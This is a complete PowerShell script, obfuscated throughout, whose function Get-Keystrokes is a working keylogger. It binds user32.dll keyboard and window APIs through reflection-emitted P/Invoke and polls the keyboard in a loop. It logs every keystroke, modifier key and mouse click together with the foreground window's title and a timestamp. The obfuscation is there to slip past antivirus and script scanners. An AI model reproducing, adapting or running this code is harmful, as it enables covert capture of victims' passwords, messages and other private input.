&("{0}{1}" -f'SEt-ItE','m')  VARiAbLe:8ecN2U (  [tyPe]("{2}{3}{1}{0}"-f 'SSEmBly','.A','R','efLeCtIon') )  ; &("{1}{0}"-f'EM','SeT-It')  VaRiABlE:jXglkd  (  [TYpE]("{1}{0}{2}" -F 'pDo','AP','Main')) ;   ${l52`q`EZ} = [TyPE]("{2}{4}{3}{6}{1}{5}{7}{0}{8}"-F'ce','il','rEfl','i','ECt','D','oN.EMIt.AssemBLYBU','erAC','Ss')  ;  &("{1}{0}" -f 'T','sE') ("x"+"Srwc")  (  [tYPE]("{12}{2}{5}{9}{10}{3}{0}{4}{1}{11}{7}{6}{8}" -F'SeRvI','S.Dlli','im','OP','Ce','E.','t','U','E','InTe','r','MpORTATTRIB','ruNT')) ;    &("{0}{1}{2}" -f 'seT-','iTE','M')  variaBlE:AQY  ( [tYPe]("{3}{8}{0}{5}{7}{6}{2}{1}{4}" -F 'ntIMe.inte','.c','s','r','AlLinGCoNVENTioN','rOPSeRVi','e','C','u'))  ;  ${K7`R6b}= [tYpe]("{0}{2}{4}{3}{5}{1}"-f'RU','.chARSeT','ntIme','NteROpS','.i','eRVICeS');   ${N`il}=  [tYpE]("{0}{2}{1}{3}"-f 'wiND','.FOrMS','OWS','.keYs')  ;    &("{0}{1}"-f 'S','et') ('JIxw7'+'5') ( [tYPe]("{0}{1}" -F 'con','sOLe')  )  ;function gE`T-keySt`ROkEs {


     ${8eCN`2u}::("{2}{4}{0}{3}{5}{1}" -f 'art','ame','Lo','ia','adWithP','lN').Invoke(("{0}{4}{3}{2}{1}{5}"-f'S','dows','em.Win','st','y','.Forms')) | &("{1}{0}{2}" -f 'ul','Out-N','l')

    try
    {
        ${im`poR`TDlL} = [User32]
    }
    catch
    {
        ${dy`NasseMB`ly} = &("{2}{0}{1}"-f 'b','ject','New-O') ("{8}{7}{6}{4}{0}{1}{3}{5}{2}" -f 'ection.','As','me','s','fl','emblyNa','stem.Re','y','S')(("{0}{1}"-f 'W','in32Lib'))
        ${AsSEMBL`Y`B`U`iLDer} =   ( &("{1}{0}"-f'iR','D')  VarIABlE:jXglkd  )."vAl`UE"::"cURre`Nt`doMAiN".("{1}{3}{2}{0}{4}"-f 'namicAsse','D','ineDy','ef','mbly').Invoke(${dynA`SSe`mBLY},  ${l`52qez}::"r`UN")
        ${m`oDU`Le`BuiLdeR} = ${AsS`EmB`l`YbUILDer}.("{0}{2}{1}{3}"-f'Defi','icMo','neDynam','dule').Invoke(("{1}{2}{0}" -f '32Lib','Wi','n'), ${fA`lsE})
        ${TY`pe`BuILdEr} = ${M`ODUl`ebUiL`D`eR}.("{1}{0}{2}" -f 'fineT','De','ype').Invoke(("{1}{0}" -f'er32','Us'), ("{2}{1}{3}{0}"-f 's','ublic,','P',' Clas'))

        ${D`LlIMP`O`Rt`cO`Nst`RucTOR} =   ${X`sRwC}."G`et`c`OnsTRuCTOR"(@([String]))
        ${F`IElDarr`AY} = [Reflection.FieldInfo[]] @(
              (  &("{0}{1}{2}"-f 'vAR','iaBL','E')  Xsrwc  )."val`UE".("{1}{2}{0}"-f'd','GetFi','el').Invoke(("{1}{2}{0}" -f 'yPoint','E','ntr')),
              ( &("{0}{3}{2}{1}"-f'GeT-','E','iaBL','VAr')  xSrwC -valUeOnL).("{1}{2}{0}"-f'd','G','etFiel').Invoke(("{1}{4}{0}{3}{2}" -f't','E','ing','Spell','xac')),
             ${xS`RWC}.("{2}{0}{1}" -f'etFie','ld','G').Invoke(("{2}{1}{0}"-f'Error','tLast','Se')),
              ${x`SRWc}.("{0}{1}{2}" -f'GetF','ie','ld').Invoke(("{0}{2}{3}{1}" -f'P','erveSig','re','s')),
              ( &("{2}{0}{1}"-f 'LdI','teM','cHI')  VaRiABlE:XSRwC )."v`ALue".("{1}{2}{0}"-f'd','G','etFiel').Invoke(("{0}{4}{3}{1}{2}{5}"-f'C','gCon','v','llin','a','ention')),
              (  &("{1}{0}{2}"-f 'i','Get-VAr','able') ("X"+"srwc") )."vA`Lue".("{1}{2}{0}" -f 'd','G','etFiel').Invoke(("{0}{1}" -f 'CharSe','t'))
        )

        ${pinvoke`meT`hOd} = ${TY`PebU`Il`der}.("{2}{0}{1}" -f'e','fineMethod','D').Invoke(("{4}{0}{1}{2}{3}" -f 's','yn','cKe','yState','GetA'), ("{2}{0}{1}{3}"-f 'blic, St','at','Pu','ic'), [Int16], [Type[]] @([Windows.Forms.Keys]))
        ${fi`El`DvaL`UEaRRAy} = [Object[]] @(
            ("{0}{4}{2}{3}{1}"-f'Get','ate','ey','St','AsyncK'),
            ${t`RuE},
            ${f`AlSe},
            ${tR`UE},
             (  &('Ls') ("vARIABle"+":"+"A"+"Qy")  )."V`ALuE"::"w`inaPi",
              ${K`7r6B}::"a`Uto"
        )
        ${cuSt`om`ATtrIB`UTE} = &("{0}{2}{1}{3}" -f 'New-','b','O','ject') ("{0}{2}{4}{6}{1}{7}{3}{5}" -f 'Re','tt','flecti','ilde','on.Emit.C','r','ustomA','ributeBu')(${dlLimPor`TC`oNSt`R`Uctor}, @(("{2}{1}{0}" -f '32.dll','ser','u')), ${Fiel`d`ArRAy}, ${f`ieL`Dv`AlUEarRAY})
        ${piN`VO`KEme`THOD}.("{3}{1}{2}{0}{4}"-f'omAttri','etCu','st','S','bute').Invoke(${cusT`oMa`T`TRIBU`TE})

        ${PInV`okEm`eT`Hod} = ${type`BuI`LdEr}.("{1}{2}{0}{3}" -f'Met','Defin','e','hod').Invoke(("{2}{4}{3}{1}{0}"-f 'tate','oardS','Ge','b','tKey'), ("{1}{2}{3}{0}" -f 'tic','Publ','i','c, Sta'), [Int32], [Type[]] @([Byte[]]))
        ${f`IEL`dv`ALueAr`Ray} = [Object[]] @(
            ("{1}{3}{0}{4}{2}" -f'e','Get','oardState','K','yb'),
            ${tR`Ue},
            ${F`ALse},
            ${t`RUE},
              ${a`Qy}::"W`iNaPI",
             (  &("{2}{0}{1}" -f'rIABl','E','va')  K7R6b -valuEO)::"au`To"
        )
        ${cUsTom`AtT`R`Ibute} = &("{1}{2}{0}" -f 'Object','Ne','w-') ("{7}{3}{2}{4}{8}{5}{1}{9}{6}{0}{10}"-f'i','ri','on.Emit','ecti','.Cus','mAtt','uteBu','Refl','to','b','lder')(${dLLImPortc`Ons`TrU`C`TOR}, @(("{2}{0}{1}" -f'er32.d','ll','us')), ${Fi`El`da`Rray}, ${Fie`ldvA`LUEAr`R`AY})
        ${PiN`V`o`ke`meTHOD}.("{3}{0}{2}{1}"-f'tCustomAttr','te','ibu','Se').Invoke(${cUs`ToMattr`ibuTe})

        ${P`in`VOKEM`eThoD} = ${T`YPEbuI`LdER}.("{1}{3}{0}{2}" -f'th','D','od','efineMe').Invoke(("{3}{1}{0}{2}" -f't','apVir','ualKey','M'), ("{1}{2}{0}{3}"-f ',','Publ','ic',' Static'), [Int32], [Type[]] @([Int32], [Int32]))
        ${fI`e`LDVALu`eArrAy} = [Object[]] @(
            ("{1}{3}{2}{0}"-f 'y','MapV','rtualKe','i'),
            ${f`ALsE},
            ${fAL`SE},
            ${tR`Ue},
              ${a`qY}::"wi`Na`Pi",
              ( &("{1}{3}{0}{2}" -f 'ab','get-var','Le','I')  ("K7r6"+"B")  -vaL )::"A`UTO"
        )
        ${C`U`sTo`mattRibUTe} = &("{1}{0}{2}"-f 'w','Ne','-Object') ("{2}{5}{4}{1}{3}{6}{0}" -f 'er','stomAttribute','Reflectio','Bu','Emit.Cu','n.','ild')(${dl`l`iMPOrtcon`sTr`U`CTor}, @(("{1}{0}{2}" -f'32','user','.dll')), ${fI`EL`DARraY}, ${F`I`eLDvaLUea`RraY})
        ${p`IN`VoKEmETHOd}.("{5}{3}{1}{4}{2}{0}"-f'ute','Custo','ttrib','et','mA','S').Invoke(${CuSt`omatt`R`ib`U`TE})

        ${PI`NVOk`Emethod} = ${tY`PeBuI`l`DER}.("{0}{2}{1}{3}"-f 'D','ine','ef','Method').Invoke(("{2}{1}{0}" -f 'ode','Unic','To'), ("{1}{0}{2}{3}"-f 'c, St','Publi','ati','c'), [Int32],
            [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
        ${fiE`LdvAlu`Ear`RAY} = [Object[]] @(
            ("{2}{0}{1}"-f 'Unic','ode','To'),
            ${fa`L`SE},
            ${F`AlsE},
            ${TR`UE},
             (  &("{1}{0}" -f'R','di')  ("VA"+"Ri"+"aBL"+"E:aqy")  )."vA`lue"::"wIn`API",
             (  &("{1}{0}"-f'm','ItE') VAriABle:K7R6b )."val`Ue"::"Au`To"
        )
        ${cu`s`T`OMATTrI`BuTe} = &("{1}{0}{2}" -f 'O','New-','bject') ("{3}{2}{4}{0}{1}{6}{5}{7}"-f '.','Custo','ection.Emi','Refl','t','uteBuild','mAttrib','er')(${DlLi`mPO`RTC`ONs`TRuctor}, @(("{2}{1}{0}"-f'2.dll','r3','use')), ${fIeL`dAr`RAy}, ${fiElDv`Al`U`EA`RRAy})
        ${P`InvOKeme`THOD}.("{1}{5}{2}{3}{0}{4}"-f'tri','SetC','st','omAt','bute','u').Invoke(${cUs`TomATt`R`IbUTE})

        ${PINVOKemET`H`od} = ${Type`BU`ildEr}.("{1}{2}{0}" -f 'od','Def','ineMeth').Invoke(("{2}{0}{3}{1}"-f'tFor','dow','Ge','egroundWin'), ("{0}{3}{2}{1}"-f 'Pu',' Static',',','blic'), [IntPtr], [Type[]] @())
        ${fIELd`VaLu`EAR`RAY} = [Object[]] @(
            ("{3}{2}{0}{1}" -f'und','Window','gro','GetFore'),
            ${t`RUe},
            ${fa`l`SE},
            ${tR`Ue},
              ${A`qy}::"Wina`Pi",
             (  &("{0}{1}{2}" -f'cHilDIt','e','M') ('VARIAbL'+'E'+':k7r6B') )."vaL`UE"::"A`UtO"
        )
        ${Cu`S`TOMAtT`RI`BuTe} = &("{1}{0}{2}"-f'e','New-Obj','ct') ("{0}{4}{2}{5}{6}{3}{1}" -f 'Reflec','teBuilder','Emit.','mAttribu','tion.','C','usto')(${d`LLIMPo`R`T`COnSt`R`UCtOr}, @(("{2}{1}{0}" -f '32.dll','ser','u')), ${fieL`dAr`R`Ay}, ${FIe`LDV`Al`UEaRrAy})
        ${P`I`NVo`KeMETHod}.("{2}{1}{0}{4}{3}" -f 'mA','sto','SetCu','bute','ttri').Invoke(${c`USTOMa`Ttr`iButE})

        ${IM`Po`RtdLL} = ${t`y`P`EBuildER}.("{0}{2}{1}"-f'Cr','e','eateTyp').Invoke()
    }

    ${L`ASt`WinDOW`T`itle} = ""

    while (${Tr`Ue}) {
        &("{1}{2}{0}"-f 't-Sleep','St','ar') -Milliseconds 40
        ${GO`TiT} = ""
        ${oUt`oUT} = ""
        
        for (${cH`AR} = 1; ${Ch`AR} -le 254; ${C`haR}++) {
            ${V`key} = ${c`hAR}
            ${G`OtIt} = ${I`Mport`DLL}::("{4}{2}{1}{0}{3}" -f'yn','As','t','cKeyState','Ge').Invoke(${V`key})
            
            if (${g`oTiT} -eq -32767) {

                
                ${left`Sh`Ift}    = (${im`p`orTdLL}::("{0}{3}{4}{2}{1}"-f'GetAs','yState','e','ync','K').Invoke(  ${N`Il}::"lsH`IFt`KeY") -band 0x8000) -eq 0x8000
                ${RiGhtsH`I`FT}   = (${IM`PorT`d`lL}::("{2}{3}{1}{4}{0}"-f 'cKeyState','s','G','etA','yn').Invoke( ${N`il}::"r`s`HIFtKEy") -band 0x8000) -eq 0x8000
                ${le`F`T`CTrl}     = (${im`PO`RTdLl}::("{0}{4}{1}{3}{2}"-f'Ge','AsyncKe','tate','yS','t').Invoke( ${n`iL}::"L`C`onTRoL`kEy") -band 0x8000) -eq 0x8000
                ${R`I`gHtcTRl}    = (${I`m`pORT`DLL}::("{0}{2}{3}{1}"-f'GetAsyncKe','te','y','Sta').Invoke(  (&("{2}{1}{0}" -f'lE','aRiAb','v')  ("N"+"Il") -vAlUe )::"rc`ontr`oLk`eY") -band 0x8000) -eq 0x8000
                ${L`E`FtAlt}      = (${imPO`RtD`lL}::("{1}{2}{0}{3}"-f 'ncKeyStat','Ge','tAsy','e').Invoke( (  &("{1}{0}"-f 'iAbLE','vaR')  NIL )."v`ALue"::"lM`enU") -band 0x8000) -eq 0x8000
                ${rIG`Ht`AlT}     = (${iMP`o`Rt`DlL}::("{1}{4}{0}{2}{3}" -f 't','Ge','a','te','tAsyncKeyS').Invoke(  ${N`il}::"rM`ENu") -band 0x8000) -eq 0x8000
                ${t`A`Bkey}       = (${i`mpOrtd`Ll}::("{4}{0}{1}{2}{3}" -f 'e','tAsyn','cKeyS','tate','G').Invoke(  ( &("{0}{1}" -f'dI','R')  ("vAri"+"ABLE"+":"+"NIl")  )."vAL`Ue"::"t`Ab") -band 0x8000) -eq 0x8000
                ${sPaC`EBaR}     = (${I`MpOr`Tdll}::("{0}{3}{1}{4}{2}"-f'G','Async','State','et','Key').Invoke(  (&("{3}{2}{1}{0}" -f'e','IAbl','-VAR','Get') NIL  )."V`AlUE"::"sPa`cE") -band 0x8000) -eq 0x8000
                ${d`EL`eteK`EY}    = (${impOR`T`DLL}::("{0}{2}{1}{3}"-f 'GetA','Stat','syncKey','e').Invoke(  ( &("{0}{1}" -f 'vARiaBL','E') niL  -ValU  )::"D`ELETe") -band 0x8000) -eq 0x8000
                ${enT`ERk`eY}     = (${i`mp`OR`TDLL}::("{3}{1}{2}{0}" -f'yState','t','AsyncKe','Ge').Invoke( ${n`iL}::"REtu`Rn") -band 0x8000) -eq 0x8000
                ${Bac`K`sPACe`KEY} = (${iMpO`R`Td`LL}::("{1}{0}{5}{3}{4}{2}" -f 'etA','G','State','n','cKey','sy').Invoke(  ( &("{1}{0}{2}" -f 'Ariab','V','LE') nIl  )."v`AlUe"::"ba`cK") -band 0x8000) -eq 0x8000
                ${LE`Fta`RROW}    = (${im`p`oRtdLl}::("{3}{0}{1}{4}{2}"-f 'e','tAsyncKey','tate','G','S').Invoke(  ${n`Il}::"L`eFT") -band 0x8000) -eq 0x8000
                ${rIGH`TA`RROw}   = (${Im`P`oRtdll}::("{1}{3}{2}{0}"-f 'ate','GetA','eySt','syncK').Invoke( ( &("{0}{1}"-f 'gc','I')  ("V"+"AriablE"+":n"+"iL") )."V`AluE"::"R`IGHT") -band 0x8000) -eq 0x8000
                ${uparr`Ow}      = (${imPo`Rt`DLl}::("{0}{1}{2}{3}"-f'GetAsync','KeySt','at','e').Invoke( ${n`Il}::"uP") -band 0x8000) -eq 0x8000
                ${dOw`N`ArRoW}    = (${im`POR`TdlL}::("{1}{4}{2}{0}{3}"-f'K','Ge','sync','eyState','tA').Invoke(  ( &("{0}{1}"-f'Var','iABLE') ('nI'+'L')  )."v`AluE"::"Do`Wn") -band 0x8000) -eq 0x8000
                ${L`efTm`O`Use}    = (${imPo`Rt`dlL}::("{4}{0}{3}{1}{2}" -f 'yn','Key','State','c','GetAs').Invoke( (  &("{1}{2}{0}{3}" -f 'ABL','get-VaR','i','e')  NIL  -va)::"LbuT`T`on") -band 0x8000) -eq 0x8000
                ${rIGH`TmOu`sE}   = (${iM`p`o`RTdLL}::("{4}{1}{0}{2}{3}"-f 'sy','etA','ncKeySta','te','G').Invoke( (  &("{1}{3}{2}{0}"-f'Iable','g','var','eT-') ("n"+"Il")  -vALU)::"rbuT`TOn") -band 0x8000) -eq 0x8000

                if (${lEF`T`sHifT} -or ${rIght`S`HI`FT}) {${o`Uto`Ut} += ("{0}{1}{2}" -f '[Shi','ft',']')}
                if (${L`Ef`TCtrL}  -or ${rI`GHt`CTRl})  {${ou`To`Ut} += ("{0}{1}" -f'[C','trl]')}
                if (${LeFt`ALT}   -or ${riG`h`TaLT})   {${oUtO`Ut} += ("{1}{0}"-f ']','[Alt')}
                if (${ta`Bk`eY})       {${oU`T`ouT} += ("{0}{1}"-f '[T','ab]')}
                if (${SpA`Ce`BAr})     {${o`UTO`UT} += ("{1}{0}{2}{3}"-f'Spa','[','ceBa','r]')}
                if (${del`ETE`k`eY})    {${ou`T`OuT} += ("{1}{2}{0}"-f ']','[Dele','te')}
                if (${en`TeR`k`Ey})     {${OU`To`Ut} += ("{0}{1}{2}"-f'[','E','nter]')}
                if (${bAc`kSpaC`eKey}) {${o`UTO`Ut} += ("{1}{2}{0}"-f ']','[','Backspace')}
                if (${L`Eft`A`Rrow})    {${o`UtouT} += ("{1}{2}{0}"-f']','[','Left Arrow')}
                if (${RIGHT`ARR`oW})   {${o`UtO`Ut} += ("{2}{1}{3}{0}" -f ']','Right Ar','[','row')}
                if (${UP`ARR`oW})      {${oUtO`Ut} += ("{0}{2}{3}{1}"-f'[Up A','w]','rr','o')}
                if (${D`o`WNArRoW})    {${o`Ut`oUT} += ("{3}{2}{0}{1}"-f 'Ar','row]','wn ','[Do')}
                if (${lEft`mo`U`se})    {${oU`To`Ut} += ("{3}{0}{2}{1}"-f 'Left Mous',']','e','[')}
                if (${RiGhT`m`O`UsE})   {${o`UTOut} += ("{1}{3}{2}{0}" -f'use]','[','Mo','Right ')}

                
                if ( ( &("{0}{2}{1}" -f'Va','Le','RiAb')  ('jixw7'+'5')  -vaL )::"cA`PSl`OCk") {${o`UTo`UT} += ("{0}{3}{1}{2}"-f '[C','s Lo','ck]','ap')}

                ${SCaN`co`DE} = ${IMp`oR`T`DlL}::("{2}{4}{3}{0}{1}" -f'tua','lKey','Ma','Vir','p').Invoke(${v`kEy}, 0x3)
                
                ${Kb`S`TATe} = &("{0}{2}{1}" -f'New','ject','-Ob') ("{1}{2}{0}"-f ']','B','yte[') 256
                ${cHE`C`KKBsta`Te} = ${iMP`OR`TDlL}::("{2}{1}{3}{0}" -f'oardState','ey','GetK','b').Invoke(${K`BSTaTe})
                
                ${My`C`HAr} = &("{0}{2}{1}"-f'Ne','ect','w-Obj') -TypeName ("{2}{0}{3}{4}{1}" -f 'st','uilder','Sy','em.','Text.StringB');
                ${Un`ICoDe`_ReS} = ${Im`pORT`d`Ll}::("{1}{3}{0}{2}" -f 'od','ToUni','e','c').Invoke(${VK`Ey}, ${S`cAnc`OdE}, ${KBStA`TE}, ${Myc`har}, ${M`YcH`AR}."cAp`ACI`Ty", 0)

                
                ${Topw`I`ND`oW} = ${im`poRTd`ll}::("{0}{5}{3}{1}{4}{2}" -f'G','oreground','dow','F','Win','et').Invoke()
                ${wI`ND`oW`TiTLe} = (&("{2}{0}{1}" -f'Pro','cess','Get-') | &("{2}{1}{0}"-f'ect','re-Obj','Whe') { ${_}."M`AinWiNdOWH`ANd`LE" -eq ${t`OpWiN`doW} })."mA`iNwiNDO`W`TItLE"
                
                if (${UNiC`Ode_R`eS} -gt 0) {
                    if (${W`iNd`oWTiTLe} -ne ${LaSTwIND`ow`TiT`le}){
                        
                        ${Ti`me`staMP} = (&("{0}{1}{2}"-f'G','e','t-Date') -Format ("{3}{0}{2}{4}{1}{5}" -f 'd/MM/y','s:','yyy:HH:mm:','d','s','ff'))
                        ${O`U`TOUt} = ("`n`n$WindowTitle "+'- '+"$TimeStamp`n")
                        ${LAStWIn`DOw`TIt`le} = ${WInDoW`Ti`TLe}
                    }
                    ${Out`O`Ut} += ${MY`cHAR}.("{0}{1}"-f'ToStrin','g').Invoke()
                    ${O`Utout}
                }
            }
        }
    }
}